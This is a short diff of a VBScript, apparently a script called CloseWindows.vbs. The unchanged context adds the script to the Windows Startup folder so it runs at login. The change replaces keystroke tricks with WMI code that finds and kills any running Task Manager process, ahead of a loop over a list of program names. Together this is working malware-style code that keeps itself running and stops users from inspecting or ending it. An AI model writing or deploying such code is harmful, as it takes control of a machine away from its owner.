@@ -7,14 +7,14 @@ Set objShellLink = WshShell.CreateShortcut(strStartupPath & "\CloseWindows.vbs.l
 objShellLink.TargetPath = WScript.ScriptFullName
 objShellLink.Save
 
-'Set Task Manager to "always on top" and minimize
-Set objShell = CreateObject("Shell.Application")
-objShell.MinimizeAll
-WshShell.Run "taskmgr.exe", 1, False
-WScript.Sleep 0 'wait for Task Manager to open
-WshShell.AppActivate "Task Manager"
-WshShell.SendKeys "^{ESC}" 'presses Ctrl+Esc to open Start menu
-WshShell.SendKeys "%{F4}" 'presses Alt+F4 to close Start menu
+'Check if Task Manager is running, and if so, close it
+Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
+Set colProcessList = objWmi.ExecQuery("Select * from Win32_Process Where Name = 'taskmgr.exe'")
+If colProcessList.Count > 0 Then
+    For Each objProcess In colProcessList
+        objProcess.Terminate()
+    Next
+End If
 
 Do
     For Each strExeName In strExeNames
